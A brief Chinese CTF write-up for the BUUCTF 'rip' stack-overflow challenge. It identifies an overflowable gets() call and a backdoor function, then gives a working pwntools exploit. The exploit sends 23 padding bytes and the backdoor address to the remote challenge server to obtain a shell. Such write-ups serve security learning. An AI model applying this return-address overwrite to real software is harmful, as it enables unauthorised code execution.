BUUCTF rip

发表于:2020-01-23，更新于:2020-01-30，By Lock
大纲

入门栈溢出题目，首先checksec一下

64位程序，没有任何保护

拖入IDA查看,F5大法好
首先是main函数

还有一个后门函数fun()

很明显,main函数中的gets存在溢出,接下来来确定溢出字节数

相对于EIP有23个字节
exp如下

from pwn import *

#io = process('./rip')
io = remote('node3.buuoj.cn', 27031)

fun_addr = 0x40118a
payload = 'A'*23
payload += p64(fun_addr)
io.sendline(payload)
io.interactive()
